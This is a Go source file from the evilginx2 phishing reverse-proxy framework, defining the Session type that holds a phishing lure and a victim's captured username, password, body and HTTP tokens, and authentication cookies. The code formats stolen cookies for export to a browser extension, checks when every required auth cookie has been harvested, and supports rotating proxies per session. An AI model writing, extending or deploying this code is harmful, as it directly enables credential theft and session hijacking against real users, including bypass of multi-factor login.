package core

import (
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
	// Session-sticky proxy rotation support
	AssignedProxy *SessionProxy `json:"-"` // Assigned proxy from pool, ignored in JSON serialization
	CreateTime    time.Time     `json:"-"` // Session creation time for janitor cleanup
}

// SessionProxy holds proxy info assigned to a session (lightweight copy)
type SessionProxy struct {
	Type     string `json:"type"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
		AssignedProxy:  nil,
		CreateTime:     time.Now(),
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	// Call the enhanced version with default values for backward compatibility
	s.AddCookieAuthTokenFull(domain, key, value, path, http_only, false, "", expires, false)
}

// AddCookieAuthTokenFull captures all cookie attributes for proper export
func (s *Session) AddCookieAuthTokenFull(domain string, key string, value string, path string, httpOnly bool, secure bool, sameSite string, expires time.Time, hostOnly bool) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	// Determine if this is a session cookie (no expiration)
	isSession := expires.IsZero() || expires.Unix() <= 0

	// Calculate expiration timestamp
	var expirationDate int64 = 0
	if !isSession {
		expirationDate = expires.Unix()
	}

	// Normalize sameSite value to match browser extension format
	normalizedSameSite := sameSite
	switch strings.ToLower(sameSite) {
	case "none":
		normalizedSameSite = "no_restriction"
	case "lax":
		normalizedSameSite = "lax"
	case "strict":
		normalizedSameSite = "strict"
	case "":
		normalizedSameSite = "unspecified"
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		// Update existing cookie
		tk.Name = key
		tk.Value = value
		tk.Domain = domain
		tk.Path = path
		tk.HttpOnly = httpOnly
		tk.Secure = secure
		tk.SameSite = normalizedSameSite
		tk.ExpirationDate = expirationDate
		tk.HostOnly = hostOnly
		tk.Session = isSession
	} else {
		// Create new cookie
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:           key,
			Value:          value,
			Domain:         domain,
			Path:           path,
			HttpOnly:       httpOnly,
			Secure:         secure,
			SameSite:       normalizedSameSite,
			ExpirationDate: expirationDate,
			HostOnly:       hostOnly,
			Session:        isSession,
		}
	}
}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}
